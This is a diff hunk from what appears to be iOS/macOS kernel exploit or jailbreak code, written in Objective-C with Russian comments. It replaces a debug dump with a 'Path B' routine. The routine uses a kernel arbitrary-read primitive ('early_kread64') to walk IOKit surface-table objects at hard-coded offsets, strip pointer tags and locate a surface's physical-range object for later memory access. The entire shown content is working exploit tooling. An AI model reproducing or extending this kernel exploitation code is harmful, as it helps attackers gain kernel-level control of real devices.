@@ -5897,14 +5897,35 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     kpNote(r, [NSString stringWithFormat:@"  резолв: surfVA=%#llx rangesVA=%#llx",
               (unsigned long long)surfVA, (unsigned long long)rangesVA]);
     if (!surfVA && rootVA) {
-        // 1.9.138: дамп окрестности rootVA — видим реальный layout реестра
-        // клиентов (count=0/arr=0 по оффсетам раунда 21 не сошлись)
-        uint64_t vt = early_kread64(rootVA);
-        kpNote(r, [NSString stringWithFormat:@"  rootVA vtable=%#llx (untag %#llx)",
-                  (unsigned long long)vt, (unsigned long long)kp_untag_ptr(vt)]);
-        for (uint64_t oo = 0x400; oo <= 0x480; oo += 8) {
-            uint64_t q = early_kread64(rootVA + oo);
-            kpNote(r, [NSString stringWithFormat:@"    root+%#03llx = %#018llx", oo, (unsigned long long)q]);
+        // Путь B (раунд 23): surface-таблица на root: count=[root+0xd8],
+        // array=[root+0xd0], obj=array[id], verify [obj+0x10]==id.
+        // (1.9.138 дампил +0x400..0x480 — не то окно.)
+        uint64_t cntR = early_kread64(rootVA + 0xd8);
+        uint64_t arrR = kp_untag_ptr(early_kread64(rootVA + 0xd0));
+        kpNote(r, [NSString stringWithFormat:@"  Path B: count=%llu array=%#llx",
+                  (unsigned long long)cntR, (unsigned long long)arrR]);
+        if (cntR > dstID && cntR < 0x400000 && kpLooksLikeKernelPointer(arrR)) {
+            uint64_t cand = kp_untag_ptr(early_kread64(arrR + (uint64_t)dstID * 8));
+            if (kpLooksLikeKernelPointer(cand)) {
+                uint32_t cid = (uint32_t)early_kread64(cand + 0x10);
+                kpNote(r, [NSString stringWithFormat:@"    Path B cand=%#llx [cand+0x10]=%u",
+                          (unsigned long long)cand, cid]);
+                if (cid == dstID) {
+                    uint64_t ro = kp_untag_ptr(early_kread64(cand + 0x178));
+                    uint64_t rq = kpLooksLikeKernelPointer(ro) ? early_kread64(ro + 0x18) : 0;
+                    if ((uint32_t)(rq >> 32) == pfn32 && (uint32_t)rq == 1) {
+                        surfVA = cand;
+                        rangesVA = ro + 0x18;
+                        kpNote(r, [NSString stringWithFormat:@"  ★ Path B: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
+                                  (unsigned long long)surfVA, (unsigned long long)ro,
+                                  (unsigned long long)rangesVA, (unsigned long long)rq]);
+                    }
+                }
+            }
+        }
+        // и правильное окно для видимости
+        for (uint64_t oo = 0xc0; oo <= 0x100; oo += 8) {
+            kpNote(r, [NSString stringWithFormat:@"    root+%#03llx = %#018llx", oo, (unsigned long long)early_kread64(rootVA + oo)]);
         }
     }
     if (!rangesVA) {
